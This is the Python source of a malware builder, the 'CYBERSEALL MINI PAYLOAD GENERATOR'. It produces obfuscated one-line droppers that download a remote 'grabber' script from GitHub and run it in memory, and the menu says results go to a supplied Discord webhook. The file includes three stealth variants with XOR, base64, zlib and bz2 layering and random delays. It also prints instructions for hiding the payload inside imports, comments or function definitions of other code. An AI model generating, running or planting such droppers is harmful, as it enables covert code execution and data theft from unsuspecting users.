import os
import sys
import json
import base64
import random
import string
import subprocess
import shutil
from colorama import Fore, Style, init

init()

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

def center(text):
    try:
        width = shutil.get_terminal_size().columns
    except Exception:
        width = 80
    if len(text) >= width:
        return text
    padding = (width - len(text)) // 2
    return " " * max(0, padding) + text

def pretty_print(text, color=(255,64,64)):
    ansi = rgb(*color)
    line = center(text)
    print(ansi + line + '\033[0m')

def create_short_payload(webhook_url, github_url):
    import zlib

    minimal_core = f"""
import subprocess,requests,base64,zlib
subprocess.run([__import__('sys').executable,'-m','pip','install','requests','pycryptodome'])
r=requests.get('{github_url}')
c=r.text.replace('WEBHOOK_PLACEHOLDER','{webhook_url}')
e=base64.b64encode(zlib.compress(c.encode(),9)).decode()
exec(zlib.decompress(base64.b64decode(e)))
""".strip().replace('\n', ';')

    compressed = base64.b64encode(zlib.compress(minimal_core.encode(), 9)).decode()

    short_payload = f";import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))"

    return short_payload

def create_long_payload(webhook_url, github_url):
    import zlib, bz2

    libs = "72657175657374732c707963727970746f646f6d652c70737574696c2c776562736f636b65742d636c69656e74"

    def x(s,k=42):return''.join(chr(ord(c)^k)for c in s)

    w = base64.b64encode(x(webhook_url,42).encode()).decode()
    g = base64.b64encode(x(github_url,42).encode()).decode()

    core = f"""
import subprocess,requests,base64,zlib,bz2,time,random
subprocess.run([__import__('sys').executable,'-m','pip','install']+bytes.fromhex('{libs}').decode().split(','))
time.sleep(random.random()*.3+.1)
def d(s,k=42):return''.join(chr(ord(c)^k)for c in s)
u=d(base64.b64decode('{g}').decode())
w=d(base64.b64decode('{w}').decode())
r=requests.get(u)
c=r.text.replace('WEBHOOK_PLACEHOLDER',w)
def e3(data):
    l1=base64.b64encode(data.encode()).decode()
    l2=base64.b64encode(zlib.compress(l1.encode(),9)).decode()
    l3=base64.b64encode(bz2.compress(l2.encode(),9)).decode()
    return l3
def d3(data):
    l3=bz2.decompress(base64.b64decode(data))
    l2=zlib.decompress(base64.b64decode(l3))
    l1=base64.b64decode(l2)
    return l1.decode()
encrypted=e3(c)
exec(d3(encrypted))
""".strip().replace('\n', ';')

    bz2_comp = bz2.compress(core.encode(), 9)
    final_comp = base64.b64encode(zlib.compress(bz2_comp, 9)).decode()

    base_payload = f";import zlib,bz2,base64,time,random;time.sleep(random.random()*.2+.1);exec(bz2.decompress(zlib.decompress(base64.b64decode('{final_comp}'))))"

    optimizations = [
        base_payload,
        base_payload.replace('time.sleep(random.random()*.2+.1)', '__import__("time").sleep(__import__("random").random()*.2)'),
        f";import zlib,bz2,base64;__import__('time').sleep(__import__('random').random()*.2);exec(bz2.decompress(zlib.decompress(base64.b64decode('{final_comp}'))))",
        f";import zlib,bz2,base64;exec(bz2.decompress(zlib.decompress(base64.b64decode('{final_comp}'))))"
    ]

    shortest = min(optimizations, key=len)

    if len(shortest) > 800:
        simple_core = f"__import__('subprocess').run([__import__('sys').executable,'-m','pip','install']+bytes.fromhex('72657175657374732c707963727970746f646f6d652c70737574696c2c776562736f636b65742d636c69656e74').decode().split(','));r=__import__('requests').get(''.join(chr(ord(c)^42)for c in __import__('base64').b64decode('{g}').decode()));c=r.text.replace('WEBHOOK_PLACEHOLDER',''.join(chr(ord(c)^42)for c in __import__('base64').b64decode('{w}').decode()));e=__import__('base64').b64encode(__import__('zlib').compress(c.encode(),9)).decode();exec(__import__('zlib').decompress(__import__('base64').b64decode(e)))"
        simple_comp = base64.b64encode(zlib.compress(simple_core.encode(), 9)).decode()
        simple_payload = f";import zlib,base64;exec(zlib.decompress(base64.b64decode('{simple_comp}')))"
        if len(simple_payload) < len(shortest):
            return simple_payload

    return shortest

def create_ultra_stealth_payload(webhook_url, github_url):
    """Ultra-Stealth Variante mit maximaler Verschleierung - KOMPAKT"""
    import zlib, bz2
    
    def xor_encrypt(text, key=69):
        return base64.b64encode(''.join(chr(ord(c) ^ key) for c in text).encode()).decode()
    
    w_enc = xor_encrypt(webhook_url)
    g_enc = xor_encrypt(github_url)
    
    libs_hex = "72657175657374732c707963727970746f646f6d65"
    
    core = f"__import__('subprocess').run([__import__('sys').executable,'-m','pip','install']+bytes.fromhex('{libs_hex}').decode().split(','));__import__('time').sleep(__import__('random').random()*.3);u=''.join(chr(ord(c)^69)for c in __import__('base64').b64decode('{g_enc}').decode());w=''.join(chr(ord(c)^69)for c in __import__('base64').b64decode('{w_enc}').decode());r=__import__('requests').get(u);c=r.text.replace('WEBHOOK_PLACEHOLDER',w);e=__import__('base64').b64encode(__import__('zlib').compress(c.encode(),9)).decode();exec(__import__('zlib').decompress(__import__('base64').b64decode(e)))"
    
    comp1 = zlib.compress(core.encode(), 9)
    comp2 = base64.b64encode(comp1).decode()
    
    payload = f";import zlib,base64;exec(zlib.decompress(base64.b64decode('{comp2}')))"
    
    return payload

def create_payload_variants(webhook_url, github_url):
    short = create_short_payload(webhook_url, github_url)
    long = create_long_payload(webhook_url, github_url)
    ultra = create_ultra_stealth_payload(webhook_url, github_url)

    return {
        'short': short,
        'long': long,
        'ultra': ultra
    }

def run_mini_payload_generator():
    os.system('cls' if os.name == 'nt' else 'clear')

    pretty_print("CYBERSEALL MINI PAYLOAD GENERATOR", (255, 0, 0))
    pretty_print("Ultra-short Payloads with GitHub Download", (255, 64, 64))
    print()

    webhook_url = input(rgb(255, 32, 32) + center("Enter Discord Webhook URL: ") + '\033[0m')
    if not webhook_url or not webhook_url.strip():
        pretty_print("No webhook URL provided!", (255, 0, 0))
        return

    print()
    default_github_url = "https://raw.githubusercontent.com/SellMeFish/TTS-Spammer/main/utils/github_grabber.py"
    github_url = input(rgb(255, 32, 32) + center(f"Enter GitHub Raw URL (Enter for default): ") + '\033[0m')
    if not github_url or not github_url.strip():
        github_url = default_github_url
        pretty_print(f"Using default GitHub URL", (0, 255, 0))

    print()
    pretty_print("PAYLOAD VARIANTS:", (255, 128, 0))
    print(rgb(150, 255, 150) + center("1. SHORT - Ultra-compact, basic encryption (~400 chars)") + '\033[0m')
    print(rgb(150, 255, 150) + center("2. LONG - Advanced stealth with multi-layer encryption (~600 chars)") + '\033[0m')
    print(rgb(255, 100, 100) + center("3. ULTRA - Maximum stealth, XOR encryption, compact (~500 chars)") + '\033[0m')
    print()

    variant = input(rgb(255, 32, 32) + center("Choose variant (1=Short, 2=Long, 3=Ultra) or Enter for Short: ") + '\033[0m')
    if not variant or variant not in ['1', '2', '3']:
        variant = "1"

    confirm = input(rgb(255, 32, 32) + center("Generate Ultra-Stealth Payload? (y/n): ") + '\033[0m')

    if confirm.lower() != 'y':
        pretty_print("Cancelled!", (255, 0, 0))
        return

    try:
        payloads = create_payload_variants(webhook_url.strip(), github_url.strip())

        if variant == "1":
            stealth_payload = payloads['short']
            payload_type = "SHORT (Basic Encryption)"
        elif variant == "2":
            stealth_payload = payloads['long']
            payload_type = "LONG (Advanced Stealth)"
        else:
            stealth_payload = payloads['ultra']
            payload_type = "ULTRA (Maximum Stealth)"

        with open("stealth_payload.py", 'w', encoding='utf-8') as f:
            f.write(stealth_payload)

        pretty_print("Stealth Payload created successfully!", (0, 255, 0))
        print()

        pretty_print("PAYLOAD LENGTH:", (255, 128, 0))
        length = len(stealth_payload)
        color = (0, 255, 0) if length < 400 else (255, 255, 0) if length < 600 else (255, 128, 0)
        print(rgb(*color) + center(f"stealth_payload.py: {length} characters") + '\033[0m')

        print()
        pretty_print("HIDING METHODS:", (255, 128, 0))
        print()

        short_payload = stealth_payload[:80] + "..." if len(stealth_payload) > 80 else stealth_payload

        print(rgb(200, 255, 200) + center("# 1. Import hiding:") + '\033[0m')
        print(rgb(150, 255, 150) + center(f"import os; {short_payload}") + '\033[0m')
        print()

        print(rgb(200, 255, 200) + center("# 2. Comment hiding:") + '\033[0m')
        print(rgb(150, 255, 150) + center(f"# System check: {short_payload}") + '\033[0m')
        print()

        print(rgb(200, 255, 200) + center("# 3. Function hiding:") + '\033[0m')
        print(rgb(150, 255, 150) + center(f"def update(): {short_payload}") + '\033[0m')
        print()

        pretty_print("WORKFLOW:", (255, 128, 0))

        if variant == "1":
            workflow = [
                "1. ;import prefix ensures compatibility",
                "2. Zlib decompression of payload",
                "3. Installs: requests, pycryptodome",
                "4. Downloads GitHub Grabber",
                "5. Base64 + Zlib encrypts downloaded code",
                "6. Executes encrypted grabber in memory",
                "7. Fast execution, basic encryption"
            ]
        elif variant == "2":
            workflow = [
                "1. ;import prefix ensures compatibility",
                "2. Random timing delays for stealth",
                "3. BZ2 + Zlib double decompression",
                "4. XOR + Base64 URL encryption",
                "5. Installs stealth libraries (4 packages)",
                "6. Triple-layer encryption of grabber code",
                "7. Executes advanced data extraction",
                "8. Sends encrypted results to webhook"
            ]
        else:
            workflow = [
                "1. ;import prefix ensures compatibility",
                "2. Double-compression (Zlib + Base64)",
                "3. XOR encryption of URLs (key=69)",
                "4. Random timing delays (0-0.3s)",
                "5. Installs core libraries (requests, pycryptodome)",
                "6. Double-layer encryption of downloaded code",
                "7. Base64 + Zlib decryption chain",
                "8. In-memory execution only",
                "9. Compact but maximum stealth",
                "10. Optimized for size and evasion"
            ]

        for step in workflow:
            print(rgb(150, 255, 150) + center(step) + '\033[0m')

        print()
        pretty_print(f"GENERATED PAYLOAD ({payload_type}):", (255, 0, 0))
        print()
        print(rgb(255, 255, 0) + center(stealth_payload) + '\033[0m')
        print()
        pretty_print(f"Length: {len(stealth_payload)} characters", (255, 255, 0))
        pretty_print(f"Type: {payload_type}", (255, 128, 0))

        print()
        pretty_print("PAYLOAD COMPARISON:", (255, 128, 0))

        short_payload_len = len(payloads['short'])
        long_payload_len = len(payloads['long'])
        ultra_payload_len = len(payloads['ultra'])

        print(rgb(150, 255, 150) + center(f"SHORT Variant: {short_payload_len} chars") + '\033[0m')
        print(rgb(150, 255, 150) + center(f"LONG Variant: {long_payload_len} chars") + '\033[0m')
        print(rgb(255, 100, 100) + center(f"ULTRA Variant: {ultra_payload_len} chars") + '\033[0m')
        print(rgb(255, 255, 0) + center(f"Selected ({payload_type}): {len(stealth_payload)} chars") + '\033[0m')

        print()
        pretty_print("VARIANT BENEFITS:", (255, 128, 0))

        if variant == "1":
            print(rgb(0, 255, 0) + center("✓ SHORT Benefits:") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Ultra-compact size (~400 chars)") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Fastest execution") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Basic encryption of downloaded code") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Zlib compression") + '\033[0m')
            print(rgb(150, 255, 150) + center("• In-memory execution") + '\033[0m')
        elif variant == "2":
            print(rgb(0, 255, 0) + center("✓ LONG Benefits:") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Advanced stealth features (~600 chars)") + '\033[0m')
            print(rgb(150, 255, 150) + center("• XOR + Base64 URL encryption") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Triple-layer code encryption") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Double compression (BZ2 + Zlib)") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Random timing delays") + '\033[0m')
            print(rgb(150, 255, 150) + center("• Stealth libraries included") + '\033[0m')
        else:
            print(rgb(255, 100, 100) + center("✓ ULTRA Benefits:") + '\033[0m')
            print(rgb(255, 150, 150) + center("• Maximum stealth features (~500 chars)") + '\033[0m')
            print(rgb(255, 150, 150) + center("• XOR encryption of URLs (key=69)") + '\033[0m')
            print(rgb(255, 150, 150) + center("• Double-layer code encryption") + '\033[0m')
            print(rgb(255, 150, 150) + center("• Double compression (Zlib + Base64)") + '\033[0m')
            print(rgb(255, 150, 150) + center("• Random timing delays (0-0.3s)") + '\033[0m')
            print(rgb(255, 150, 150) + center("• Compact size optimization") + '\033[0m')
            print(rgb(255, 150, 150) + center("• Core library installation") + '\033[0m')
            print(rgb(255, 150, 150) + center("• In-memory execution only") + '\033[0m')

    except Exception as e:
        pretty_print(f"Error creating payloads: {str(e)}", (255, 0, 0))

    print()
    input(rgb(255, 32, 32) + center("Press Enter to continue...") + '\033[0m')

if __name__ == "__main__":
    run_mini_payload_generator()

# update
